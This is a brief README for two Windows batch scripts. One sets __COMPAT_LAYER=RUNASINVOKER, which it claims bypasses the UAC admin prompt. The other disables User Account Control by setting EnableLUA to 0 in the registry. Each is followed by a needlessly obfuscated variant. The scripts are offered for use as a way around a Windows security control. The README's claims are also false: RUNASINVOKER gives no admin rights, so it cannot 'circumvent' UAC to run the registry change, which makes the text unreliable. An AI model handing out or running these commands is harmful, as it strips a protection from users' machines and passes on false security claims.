# bypassUAC

Program bypasses the UAC prompt for Admin privileges when running a program.

-   Replace [Example.exe] with the file_path and filename of the target program.
-   Run bypassUAC.cmd
-   The target program will run as the currently logged in user and bypass the UAC prompt.

    *start "" /b cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && Example.exe"*

If you like complexity :)

    setlocal enabledelayedexpansion & set "__COMPAT_LAYER=RUNASINVOKER" & start "" /min cmd /C "setlocal enabledelayedexpansion ^& (echo ^^^!__COMPAT_LAYER^^^! ^& start "" /min Example.exe)"



# UAC_disable

This script disables the User Access Control (UAC) in the Windows Registry. Run the script throughUAC_Bypass to circumvent UAC's self-preservation module.enter code here

    reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

If you like complexity :)

    setlocal enabledelayedexpansion & set "command=reg.exe" & set "args=ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" & set "cmd=!command! !args!" & cmd /V /C "!cmd!"
